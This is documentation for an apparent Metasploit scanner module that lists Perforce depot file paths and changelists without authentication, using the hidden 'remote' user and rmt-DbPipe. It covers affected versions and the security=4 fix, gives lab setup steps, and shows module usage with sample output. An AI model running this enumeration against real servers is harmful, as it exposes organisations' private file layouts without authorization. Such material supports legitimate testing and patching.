## Description

Enumerates depot file paths and changelist numbers from Perforce (Helix Core)
servers without authentication, by exploiting the hidden `remote` user and
the server-to-server `rmt-DbPipe` RPC.

`rmt-DbPipe` is a server-to-server protocol command that reads directly from
the `db.rev` database table. When the server-to-server protocol handshake is
sent as the `remote` user, authentication is bypassed entirely and the full
depot revision history is returned as a binary blob. This reveals every file
path that has ever been committed to the depot, along with changelist numbers
and dates.

The vulnerability exists because the `remote` user is a hidden built-in
account with no password, intended only for trusted peer-server communication.
Any client that mimics the server-to-server handshake format can invoke it.

Auto-detects SSL/TLS and unicode server modes — no manual flags required.

**Affected:** Perforce server versions below 2025.1 with `security < 4`
(default security level is 0).

**Remediation:** Upgrade to 2025.1 or later, or:
```
p4 configure set security=4
```

## Vulnerable Application

### Install a vulnerable Perforce server (Linux)

```bash
# Download p4d 2024.2 (subject to Perforce terms of use: https://www.perforce.com/legal)
# 2024.2 is the last version affected by this vulnerability
wget https://ftp.perforce.com/perforce/r24.2/bin.linux26x86_64/p4d
wget https://ftp.perforce.com/perforce/r24.2/bin.linux26x86_64/p4
chmod +x p4d p4

# Start a server on port 1666 (security defaults to 0 — vulnerable)
mkdir p4root_test
./p4d -r ./p4root_test -p 1666 -d

# Add some depot content
./p4 -p 1666 -u admin client -i <<EOF
Client: test_ws
Root: /tmp/test_ws
View:
  //depot/... //test_ws/...
EOF
mkdir /tmp/test_ws
echo "secret config" > /tmp/test_ws/config.yml
./p4 -p 1666 -u admin -c test_ws add /tmp/test_ws/config.yml
./p4 -p 1666 -u admin -c test_ws submit -d "Initial commit"
```

The default `security=0` allows `rmt-DbPipe` to be invoked unauthenticated.

## Verification Steps

1. `use auxiliary/scanner/perforce/perforce_remote_depot`
2. `set RHOSTS <target>`
3. `set RPORT 1666`
4. `run`
5. Depot file paths are printed and stored to loot.

## Options

| Option  | Default | Description                          |
|---------|---------|--------------------------------------|
| RHOSTS  |         | Target host(s)                       |
| RPORT   | 1666    | Perforce server port                 |
| TIMEOUT | 15      | Connection and read timeout (seconds)|

Note: Large depots may require increasing TIMEOUT. The server streams the
entire `db.rev` table in the response; 15 seconds is sufficient for most
installations.

## Scenarios

### Vulnerable server — depot files retrieved

```
msf6 > use auxiliary/scanner/perforce/perforce_remote_depot
msf6 auxiliary(scanner/perforce/perforce_remote_depot) > set RHOSTS 192.0.2.10
RHOSTS => 192.0.2.10
msf6 auxiliary(scanner/perforce/perforce_remote_depot) > run

[+] 192.0.2.10:1666 [tcp] 4 depot file revision(s) retrieved via rmt-DbPipe:
[*]   [change=3] [2025-11-03] //depot/Source/main.cpp
[*]   [change=2] [2025-10-14] //depot/Config/database.yml
[*]   [change=1] [2025-09-22] //depot/Config/secrets.env
[*]   [change=1] [2025-09-22] //depot/Source/auth.cpp
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### SSL server (auto-detected)

```
msf6 auxiliary(scanner/perforce/perforce_remote_depot) > set RHOSTS 192.0.2.20
RHOSTS => 192.0.2.20
msf6 auxiliary(scanner/perforce/perforce_remote_depot) > run

[+] 192.0.2.20:1666 [ssl] 2 depot file revision(s) retrieved via rmt-DbPipe:
[*]   [change=1] [2025-11-03] //depot/src/main.cpp
[*]   [change=1] [2025-11-03] //depot/config/app.yml
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### Patched server (2025.1+ or security=4)

```
msf6 auxiliary(scanner/perforce/perforce_remote_depot) > run

[*] 192.0.2.10:1666 - No depot files returned (server may be patched or security>=4)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
